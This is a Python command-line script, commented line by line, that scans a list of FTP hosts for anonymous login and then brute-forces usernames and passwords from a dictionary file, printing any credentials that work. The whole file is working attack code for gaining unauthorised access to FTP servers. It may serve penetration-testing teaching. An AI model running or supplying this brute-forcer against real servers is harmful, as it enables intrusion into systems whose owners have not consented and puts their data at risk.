from ftplib import *  # Import necessary modules from the ftplib library.
import argparse  # Import the argparse module for command-line argument parsing.
import time  # Import the time module for introducing delays.


# Anonymous login scan
def anonScan(
    hostname,
):  # Function to check for anonymous FTP login on a host (takes hostname as a parameter).
    try:
        with FTP(hostname) as ftp:  # Create an FTP object for the given hostname.
            ftp.login()  # Attempt an anonymous login to the FTP server.
            print(
                "\n[*] " + str(hostname) + " FTP Anonymous login successful!"
            )  # Print success message if login is successful.
            return True  # Return True to indicate successful anonymous login.
    except Exception as e:  # Handle exceptions if anonymous login fails.
        print(
            "\n[-] " + str(hostname) + " FTP Anonymous logon failure!"
        )  # Print failure message.
        return False  # Return False to indicate anonymous login failure.


# Brute-force login
def vlcLogin(
    hostname, pwdFile
):  # Function to attempt brute-force FTP login (takes hostname and password file as parameters).
    try:
        with open(pwdFile, "r") as pf:  # Open the password file for reading.
            for (
                line
            ) in pf.readlines():  # Iterate through each line in the password file.
                time.sleep(1)  # Introduce a 1-second delay between login attempts.
                userName = line.split(":")[0]  # Extract the username from the line.
                passWord = (
                    line.split(":")[1].strip("\r").strip("\n")
                )  # Extract the password from the line and remove trailing whitespace.
                print(
                    "[+] Trying: " + userName + ":" + passWord
                )  # Print the current login attempt.

                try:
                    with FTP(
                        hostname
                    ) as ftp:  # Create an FTP object for the given hostname.
                        ftp.login(
                            userName, passWord
                        )  # Attempt to login using the extracted username and password.
                        print(
                            "\n[+] "
                            + str(hostname)
                            + " FTP Login successful: "
                            + userName
                            + ":"
                            + passWord
                        )  # Print success message if login is successful.
                        return (
                            userName,
                            passWord,
                        )  # Return the successful username and password.
                except Exception as e:
                    pass  # Continue to the next attempt if login fails (exception is caught).

    except IOError as e:
        print(
            "Error: the password file does not exist!"
        )  # Handle an IOError if the password file does not exist.

    print(
        "\n[-] Cannot crack the FTP password, please change the password dictionary and try again!"
    )  # Print a message indicating unsuccessful password cracking.
    return (None, None)  # Return None values to indicate failure.


def main():
    parser = argparse.ArgumentParser(
        description="FTP Scanner"
    )  # Create an ArgumentParser object with a description.
    parser.add_argument(
        "-H", dest="hostName", help='The host list with ","space'
    )  # Define a command-line argument for hostnames.
    parser.add_argument(
        "-f", dest="pwdFile", help="Password dictionary file"
    )  # Define a command-line argument for the password dictionary file.
    options = None

    try:
        options = parser.parse_args()  # Parse the command-line arguments.
    except:
        print(
            parser.parse_args(["-h"])
        )  # Print the help message if there's an issue with argument parsing.
        exit(0)

    hostNames = str(options.hostName).split(
        ","
    )  # Split hostnames into a list using ',' as a delimiter.
    pwdFile = (
        options.pwdFile
    )  # Get the password dictionary filename from the command-line arguments.

    if hostNames == ["None"]:
        print(
            parser.parse_args(["-h"])
        )  # Print the help message if no hostnames are provided.
        exit(0)

    for hostName in hostNames:
        username = None
        password = None
        if anonScan(hostName) == True:  # Check for anonymous FTP login on the host.
            print("Host: " + hostName + " Can be accessed anonymously!")
        elif pwdFile is not None:
            (username, password) = vlcLogin(
                hostName, pwdFile
            )  # Attempt brute-force login with the given password file.
            if password is not None:
                print(
                    "\n[+] Host: "
                    + hostName
                    + " Username: "
                    + username
                    + " Password: "
                    + password
                )  # Print successful login details.

    print(
        "\n[*]-------------------Scan End!--------------------[*]"
    )  # Print a scan completion message.


if __name__ == "__main__":
    main()  # Execute the main function when the script is run.
